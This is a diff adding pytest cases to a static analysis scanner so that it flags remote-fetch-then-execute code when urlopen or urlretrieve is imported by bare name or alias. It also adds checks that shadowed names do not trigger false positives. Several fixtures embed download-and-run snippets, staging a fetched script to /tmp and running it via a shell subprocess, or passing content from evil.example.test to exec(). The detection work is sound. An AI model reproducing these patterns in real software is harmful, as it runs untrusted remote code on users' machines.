@@ -260,6 +260,223 @@ def test_remote_staged_exec_quiet_when_written_file_is_only_parsed():
     assert "REMOTE_STAGED_EXEC" not in _rules(src)
 
 
+# ---------------------------------------------------------------------------
+# CLAWSECCHECK-B-927: `_is_remote_fetch_call` recognised only the ATTRIBUTE-call
+# spelling (`urllib.request.urlopen(...)`), so a bare name bound by
+# `from urllib.request import urlopen` was invisible to the staged-write
+# correlation above -- REMOTE_STAGED_EXEC missed the ticket's own PoC (staged write +
+# subprocess shell exec) even though the attribute-style equivalent already fired.
+# `_is_remote_fetch_call` now takes an optional `facts` (the file's
+# `shippedexec._FileFacts`/`PathFacts`) and additionally recognises `urlopen`/
+# `urlretrieve` resolved via `facts.dotted()` to `urllib.request.urlopen`/
+# `urllib.request.urlretrieve` -- narrow on purpose (never bare `get`/`post`/
+# `request`, which are common generic names with no import to anchor them), and
+# shadow-/alias-safe because `facts.dotted()` excludes any name ALSO bound by a
+# local def/assignment/other import elsewhere in the file. REMOTE_STAGED_IMPORT (the
+# B-917 loader-sink correlation) already had its own, independent fix for this exact
+# gap -- see `_B917_REMOTE_FUNCS` in skillast.py and
+# tests/test_b917_loader_staged_import.py::test_o3_ticket_verbatim_bare_urlopen_staged_import_is_fail
+# -- so only the older, non-loader REMOTE_STAGED_EXEC path needed this change.
+# ---------------------------------------------------------------------------
+
+
+def test_remote_staged_exec_bare_name_urlopen_import():
+    """The ticket's own repro: `from urllib.request import urlopen`, staged to a
+    literal path, then run through a shell subprocess call."""
+    src = (
+        "from urllib.request import urlopen\n"
+        'with open("/tmp/_provision.sh", "w") as fh:\n'
+        '    fh.write(urlopen("https://example.invalid/x").read().decode())\n'
+        "import subprocess\n"
+        'subprocess.run("bash /tmp/_provision.sh", shell=True)\n'
+    )
+    found = [af for af in analyze_python(src, "p.py") if af.rule == "REMOTE_STAGED_EXEC"]
+    assert found, f"expected REMOTE_STAGED_EXEC, got {_rules(src)}"
+    assert found[0].severity == "crit"
+    assert "/tmp/_provision.sh" in found[0].reason
+
+
+def test_remote_staged_exec_attribute_style_still_works():
+    """Regression pin: the pre-existing attribute-call spelling this rule already
+    caught must keep working exactly as before."""
+    src = (
+        "import urllib.request, subprocess\n"
+        'with open("/tmp/_provision.sh", "w") as fh:\n'
+        '    fh.write(urllib.request.urlopen("https://example.invalid/x").read().decode())\n'
+        'subprocess.run("bash /tmp/_provision.sh", shell=True)\n'
+    )
+    found = [af for af in analyze_python(src, "p.py") if af.rule == "REMOTE_STAGED_EXEC"]
+    assert found, f"expected REMOTE_STAGED_EXEC, got {_rules(src)}"
+    assert found[0].severity == "crit"
+
+
+def test_remote_staged_exec_bare_name_urlretrieve_import():
+    """`urlretrieve`, not just `urlopen`, must be recognised as a bare-name import --
+    routed through a local helper return hop, mirroring `requests.get`'s own
+    coverage of the indirect shape."""
+    src = (
+        "from urllib.request import urlretrieve\n"
+        "def _fetch(url):\n"
+        '    r = urlretrieve(url)\n'
+        "    return r\n"
+        'data = _fetch("https://example.invalid/x")\n'
+    )
+    # `urlretrieve` downloads straight to disk (no `.read()`/`.write()` pair for the
+    # staged-write correlation to see) even in its pre-existing ATTRIBUTE-call form --
+    # a structural gap this ticket does not touch. What this pins instead is that the
+    # bare name is recognised as a network-fetch call AT ALL, the same way the
+    # attribute form already is, via _is_remote_fetch_call/_expr_reads_remote.
+    from clawseccheck.skillast import _expr_reads_remote, _shippedexec
+    import ast
+    tree = ast.parse(src)
+    facts = _shippedexec.PathFacts(tree, "p.py")
+    call = next(
+        n for n in ast.walk(tree)
+        if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id == "urlretrieve"
+    )
+    assert _expr_reads_remote(call, facts)
+    assert not _expr_reads_remote(call)  # no facts supplied -- old, unwidened behaviour
+
+
+def test_remote_staged_exec_bare_name_aliased_import():
+    """`from urllib.request import urlopen as fetch` -- the alias must resolve
+    through `facts.dotted()` too, not just the un-aliased spelling."""
+    src = (
+        "from urllib.request import urlopen as fetch\n"
+        'with open("/tmp/_provision.sh", "w") as fh:\n'
+        '    fh.write(fetch("https://example.invalid/x").read().decode())\n'
+        "import subprocess\n"
+        'subprocess.run("bash /tmp/_provision.sh", shell=True)\n'
+    )
+    found = [af for af in analyze_python(src, "p.py") if af.rule == "REMOTE_STAGED_EXEC"]
+    assert found, f"expected REMOTE_STAGED_EXEC, got {_rules(src)}"
+
+
+def test_remote_staged_exec_quiet_for_locally_shadowed_urlopen():
+    """C-135: a locally-defined `def urlopen(...)` with NO import at all must never
+    be treated as a network fetch just because it shares the name."""
+    src = (
+        "def urlopen(x):\n"
+        "    return x.upper()\n\n"
+        'with open("/tmp/_provision.sh", "w") as fh:\n'
+        '    fh.write(urlopen("hello"))\n'
+        "import subprocess\n"
+        'subprocess.run("bash /tmp/_provision.sh", shell=True)\n'
+    )
+    assert "REMOTE_STAGED_EXEC" not in _rules(src)
+
+
+def test_remote_staged_exec_quiet_for_urlopen_imported_from_unrelated_module():
+    """C-135: `urlopen` imported from a module that is NOT `urllib.request` must
+    never be treated as a network fetch just because of its bare name."""
+    src = (
+        "from mycompany.netutil import urlopen\n\n"
+        'with open("/tmp/_provision.sh", "w") as fh:\n'
+        '    fh.write(urlopen("https://internal.example/x").read())\n'
+        "import subprocess\n"
+        'subprocess.run("bash /tmp/_provision.sh", shell=True)\n'
+    )
+    assert "REMOTE_STAGED_EXEC" not in _rules(src)
+
+
+def test_remote_staged_exec_quiet_for_import_then_local_reassignment():
+    """C-135: `from urllib.request import urlopen` followed by a LOCAL rebinding of
+    the same name must void the import -- the rebound name is no longer network-
+    derived, and `_FileFacts._import_table()`'s own shadow rule (a name bound by
+    more than one kind of binding is excluded) already guarantees this."""
+    src = (
+        "from urllib.request import urlopen\n\n"
+        "def urlopen(x):\n"
+        '    return open(x, "rb").read()\n\n'
+        'with open("/tmp/_provision.sh", "w") as fh:\n'
+        '    fh.write(urlopen("local_payload.bin"))\n'
+        "import subprocess\n"
+        'subprocess.run("bash /tmp/_provision.sh", shell=True)\n'
+    )
+    assert "REMOTE_STAGED_EXEC" not in _rules(src)
+
+
+def test_remote_staged_exec_quiet_for_class_method_named_urlopen():
+    """C-135: a class method literally named `urlopen`, called via `self.urlopen(...)`
+    -- an ATTRIBUTE-call form outside this rule's `_REMOTE_FETCH_BASES` (`self` is
+    not a recognised network-client base), unaffected by this widening either way."""
+    src = (
+        "class Fetcher:\n"
+        "    def urlopen(self, u):\n"
+        '        return b"local-only, not network"\n\n'
+        "    def stage(self):\n"
+        '        with open("/tmp/_provision.sh", "w") as fh:\n'
+        "            fh.write(self.urlopen(\"x\").decode())\n"
+        "        import subprocess\n"
+        '        subprocess.run("bash /tmp/_provision.sh", shell=True)\n'
+    )
+    assert "REMOTE_STAGED_EXEC" not in _rules(src)
+
+
+def test_remote_code_load_bare_name_helper_hop_now_recognized():
+    """B-993: `_remote_code_load_findings` now receives `facts` (threaded exactly the
+    way B-927 threaded it into the REMOTE_STAGED_EXEC call site), so a bare-name
+    `urlopen` reaching exec() through a local helper's return value (the ONE case
+    this rule exists for) FIRES now -- previously this was a confirmed, deliberately
+    scoped-out gap (see the retracted assertion this test replaces); B-993 closed it
+    on REMOTE_CODE_LOAD's own merits."""
+    src = (
+        "from urllib.request import urlopen\n\n"
+        "def _load(url):\n"
+        '    return urlopen(url, timeout=5).read().decode("utf-8", "ignore")\n\n'
+        'code = _load("https://evil.example.test/l.py")\n'
+        "exec(code)\n"
+    )
+    found = [af for af in analyze_python(src, "x.py") if af.rule == "REMOTE_CODE_LOAD"]
+    assert found, f"expected REMOTE_CODE_LOAD, got {_rules(src)}"
+    assert found[0].severity == "crit"
+
+
+def test_remote_code_load_bare_name_aliased_import_still_fires():
+    """B-993: the alias spelling (`from urllib.request import urlopen as fetch`) must
+    resolve through `facts.dotted()` too, matching B-927's own aliasing coverage for
+    REMOTE_STAGED_EXEC (`test_remote_staged_exec_bare_name_aliased_import`)."""
+    src = (
+        "from urllib.request import urlopen as fetch\n\n"
+        "def _load(url):\n"
+        '    return fetch(url, timeout=5).read().decode("utf-8", "ignore")\n\n'
+        'code = _load("https://evil.example.test/l.py")\n'
+        "exec(code)\n"
+    )
+    found = [af for af in analyze_python(src, "x.py") if af.rule == "REMOTE_CODE_LOAD"]
+    assert found, f"expected REMOTE_CODE_LOAD, got {_rules(src)}"
+
+
+def test_remote_code_load_quiet_for_urlopen_aliased_from_unrelated_stdlib():
+    """FP-safety probe (B-993, same bar B-927 already established): a bare `urlopen`
+    aliased from an UNRELATED stdlib function (`shutil.which`, not
+    `urllib.request.urlopen`) must never be treated as a network fetch just because
+    of its local name."""
+    src = (
+        "from shutil import which as urlopen\n\n"
+        "def _load(name):\n"
+        "    return urlopen(name)\n\n"
+        'code = _load("python3")\n'
+        "exec(code)\n"
+    )
+    assert "REMOTE_CODE_LOAD" not in _rules(src)
+
+
+def test_remote_code_load_quiet_for_urlopen_imported_from_unrelated_module():
+    """FP-safety probe (B-993): `urlopen` imported from a module that is NOT
+    `urllib.request` must never be treated as a network fetch just because of its
+    bare name -- mirrors
+    `test_remote_staged_exec_quiet_for_urlopen_imported_from_unrelated_module`."""
+    src = (
+        "from mycompany.netutil import urlopen\n\n"
+        "def _load(url):\n"
+        "    return urlopen(url).read()\n\n"
+        'code = _load("https://internal.example/x")\n'
+        "exec(code)\n"
+    )
+    assert "REMOTE_CODE_LOAD" not in _rules(src)
+
+
 def test_shell_staged_exec_curl_to_path_then_source():
     """`curl -o P` + `source P` is semantically `source <(curl ...)`, which
     SHELL_EVAL_REMOTE only catches in its inline form."""
